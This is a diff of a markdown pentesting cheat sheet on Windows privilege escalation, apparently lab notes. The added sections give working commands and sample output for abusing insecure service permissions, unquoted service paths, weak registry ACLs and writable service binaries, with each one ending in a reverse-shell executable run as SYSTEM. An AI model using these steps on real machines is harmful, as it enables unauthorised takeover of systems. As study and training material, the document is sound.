@@ -11,32 +11,7 @@ cmd> cd %TEMP%
 ```
 
 
-## Windows Native programs
-Those programs can be found on every post Win10 machines:
-
-* System configuration: `MSConfig`
-* Control Panel: `control.exe`
-* Windows Troubleshooting:  `C:\Windows\System32\control.exe /name Microsoft.Troubleshooting`
-* User Account Control Settings: `UserAccountControlSettings.exe`
-* Computer Management (Task Scheduler, Event Viewer ...): `compmgmt.msc`
-* System Information: `msinfo32.exe`
-* Ressource Monitor: `resmon.exe`
-* Registry editor: `regedt32.exe`
-
-## Basic cmd Commands
-Read about them using help: [command_name] /?
-
-* Access Command prompt: cmd.exe
-* whoami /all
-* netstat: all -a, route -r
-* hostname 
-* ipconfig /all
-* net
-
-
-
-## Network Enumeration
-
+## Enumeration
 
 ### NetBIOS
 
@@ -182,13 +157,18 @@ Use accesscheck from sysinternals
 
 `accesschk.exe /accepteula`
 
-Check where the use has write access
+Check accessea
 
-`.\accesschk.exe /accepteula user -w c:\`
+`.\accesschk.exe /accepteula -uwcqv user c:\`
 
 ### Services
 
 Programs running in the background. If run under SYSTEM and compromised, they lead to priv esc.
+
+Enumerate service with winpeas
+
+`winpeas.exe quiet servicesinfo`
+
 
 Configuration query
 `sc.exe qc <name>`
@@ -196,11 +176,167 @@ Configuration query
 Status query
 `sc.exe query <name>`
 
+Check rights of the user on service
+
+```powershell
+# use accesschk
+
+PS C:\Temp> .\accesschk.exe /accepteula -ucqv user regsvc
+
+R  regsvc
+	SERVICE_QUERY_STATUS
+	SERVICE_QUERY_CONFIG # ask the config
+	SERVICE_INTERROGATE
+	SERVICE_ENUMERATE_DEPENDENTS
+	SERVICE_START # we can start
+	SERVICE_STOP # we can stop
+	READ_CONTROL
+
+```
+
 Modify options
 `sc.exe config <name> <options>= <value>`
+i.e. `sc config daclsvc binpath= "\"c:\PrivEsc\rev.exe\""`
+
+Official list of parameters: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config
 
 Start/Stop Service
 `net start/stop <name>`
+i.e. 'net start daclsvc' 
+
+#### Service Exploitation
+
+
+1. Insecure Service Properties
+
+Dangerous permissions: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
+
+RABBIT HOLE: Make sure you can restart the service or machine to make changes active!
+
+2. Unquoted Service Path
+
+```cmd
+wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+* Or use accesschk.exe to check permissions on all directories within C:\
+
+* Example unquoted path: c:\Program Files\Unquoted Path\Some Program\bin.exe
+
+```powershell
+# First check c:\
+accesschk.exe /accepteula -uwdq C:\
+
+#output 
+PS C:\temp> .\accesschk.exe /accepteula -uwdq "c:\"
+
+
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+  RW NT SERVICE\TrustedInstaller
+
+# Check 'Program Files'
+
+PS C:\temp> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+  RW pc\user # Bingo! RW access for user!
+
+# Bingo! User has local access read and write rights
+# Now we can create a malicious Uquoted.exe with reverse shell in Program Files directory and exploit it by restarting the service
+```
+
+
+3. Weak Registry Permissions
+
+First, check
+
+```powershell
+# check registry permissions of a service for HKLM\system\currentcontrolset\services\regsvc
+
+PS C:\Temp> Get-Acl HKLM:\system\currentcontrolset\services\regsvc | Format-List
+Get-Acl HKLM:\system\currentcontrolset\services\regsvc | Format-List
+
+
+Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
+Owner  : BUILTIN\Administrators
+Group  : NT AUTHORITY\SYSTEM
+Access : Everyone Allow  ReadKey
+         NT AUTHORITY\INTERACTIVE Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl
+Audit  : 
+Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)
+
+# OR same with accesschk.exe
+
+.\accesschk.exe /accept eula -uvwqk HKLM\system\currentcontrolset\services\regsvc
+
+# we see that NT AUTHORITY\INTERACTIVE has full control
+# all localy logged in users are part of the INTERACTIVE GROUP
+# So changing this registry entry can allow users to perform privileged actions
+```
+
+Now, check current reistry values for interesting entries
+
+```powershell
+PS C:\Temp> reg query HKLM\system\currentcontrolset\services\regsvc
+
+HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
+    Type    REG_DWORD    0x10
+    Start    REG_DWORD    0x3
+    ErrorControl    REG_DWORD    0x1
+    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe" #looks interesting
+    DisplayName    REG_SZ    Insecure Registry Service
+    ObjectName    REG_SZ    LocalSystem
+
+```
+
+Replace registry entry with your own
+
+```powershell
+
+reg add HKLM\system\currentcontrolset\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\user\AppData\Local\Temp\priv\rev4444.exe" /f
+
+The operation completed successfully.
+```
+
+Now just start the service again and await reverse shell.
+
+4. Insecure Executables
+
+If original executable is writeable than it can be replaced with malicious file to obtain shell.
+
+Detection in winpeas: `File Permissions: Everyone [AllAccess]`
+
+```powershell
+# confirm with accesschk
+
+.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+C:\Program Files\File Permissions Service\filepermservice.exe
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW Everyone # everyone can access this file and RW on it
+	FILE_ALL_ACCESS 
+  RW NT AUTHORITY\SYSTEM
+	FILE_ALL_ACCESS
+  RW BUILTIN\Administrators
+	FILE_ALL_ACCESS
+  RW P1\Pentester
+	FILE_ALL_ACCESS
+  RW BUILTIN\Users
+	FILE_ALL_ACCESS
+
+```
+
+Let's back it up and the overwrite with shell file.
+
+`copy rev4444.exe "C:\Program Files\File Permissions Service\filepermservice.exe"`
+
+Now start malicous executable via service `net start filepermsvc`
+
+5. DLL Hijacking
 
 
 ### Kernel Exploits
